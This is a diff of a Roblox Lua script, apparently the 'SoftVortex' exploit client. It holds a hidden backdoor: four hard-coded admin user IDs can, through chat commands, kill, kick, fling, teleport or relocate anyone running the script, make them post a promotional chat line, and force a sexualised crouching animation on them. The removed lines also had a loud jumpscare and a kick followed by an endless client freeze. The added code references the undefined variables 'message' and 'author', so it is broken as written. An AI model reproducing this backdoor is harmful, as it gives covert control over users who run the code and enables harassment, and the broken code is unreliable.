@@ -2,82 +2,118 @@ local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 
 local Admins = {
-    2935773828,--Airsoft#0001
-    413956126,--Dilun#4181
-    2539559084,--9tracks#0848
-    354429433,--SxLn/lethal#0599
+    2935773828, --Airsoft#0001
+    413956126, ---Dilun#4181
+    2539559084, ---9tracks#0848
+    354429433, ---SxLn/lethal#0599
 }
+
 local function commands(msg, plr)
     if table.find(Admins, plr) then
-        local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
-        local Msg = string.lower(msg)
-        local SplitCMD = string.split(Msg, ",")
-        local Lower = string.lower(player.Name)
-        local Allowed = string.find(Lower, SplitCMD[2])
-        if Allowed then
-            if string.find(SplitCMD[1], ":freeze") then
-                player.Character.HumanoidRootPart.Anchored = true
+       if message:sub(1, 6) == "!bring" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
             end
-            if string.find(SplitCMD[1], ":unfreeze") then
-                player.Character.HumanoidRootPart.Anchored = false
+        end
+        -- kill start
+        if message:sub(1, 5) == "!kill" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
-            if string.find(SplitCMD[1], ":users") then
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get Good, Get SoftVortex!", "All")
+        end
+        --  kill end
+        -- kick start
+        if message:sub(1, 5) == "!kick" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer:Kick("\nYou Were Kicked")
+    
             end
-            if string.find(SplitCMD[1], ":fling") then
-                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+        end
+        
+
+        if message:sub(1, 9) == "!unfreeze" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.Head.Anchored = false
             end
-             if string.find(SplitCMD[1], ":scare") then
-                function Scare()
-                    local ScreenGui = Instance.new("ScreenGui")
-                    local ImageLabel = Instance.new("ImageLabel")
-
-                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}
-
-                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}
-
-                    ScreenGui.Parent = game.CoreGui
-                    ScreenGui.Name = "SCREAM"
-                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-                    ImageLabel.Parent = ScreenGui
-                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
-                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
-                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
-                    ImageLabel.Visible = false
-                    ImageLabel.BackgroundTransparency = 1
-                    ImageLabel.Visible = true
-                    local sound = Instance.new("Sound")
-                    sound.Parent = game.Workspace
-                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
-                    sound.Volume = 200
-                    sound:Play()
-                    for i = 0, 1, 0.1 do
-                        wait(0.05)
-                        ImageLabel.ImageTransparency = i
+        end
+        
+        if message:sub(1, 5) == "!benx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                bending = true
+                local segtarget = author.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                     end
-                    sound.Ended:Wait()
-                    sound:Destroy()
-                    ScreenGui:Destroy()
-                end
-                if not game.CoreGui:FindFirstChild("SCREAM") then
-                    Scare()
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+        end
+
+
+        if message:sub(1, 7) == "!unbenx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                while bending == true do
+                    wait()
+                    bending = false
                 end
             end
-            if string.find(SplitCMD[1], ":kick") then
-                local ISADMIN = table.find(Admins, player.UserId)
-                if not ISADMIN then
-                    player:Kick("Kicked.")
-                    Webhook(player, "USER KICKED!")
-                    wait(5)
-                    while true do
-                    end
+        end
+        
+        if message:sub(1, 6) == "!fling" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        end
+    
+        -- kick end
+        if message == "!users" then
+            if author ~= game.Players.LocalPlayer.Name then
+                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+                path:FireServer("SoftVortex on Top","all")
+            end
+        end
+    
+
+
+            if message:sub(1, 7) == "!rejoin" then
+                if message:match(game.Players.LocalPlayer.Name) then
+                    local TeleportService = game:GetService("TeleportService")
+                    TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
                 end
             end
-        else
-end
-    end
+        end
 end
 
 Players.PlayerAdded:Connect(
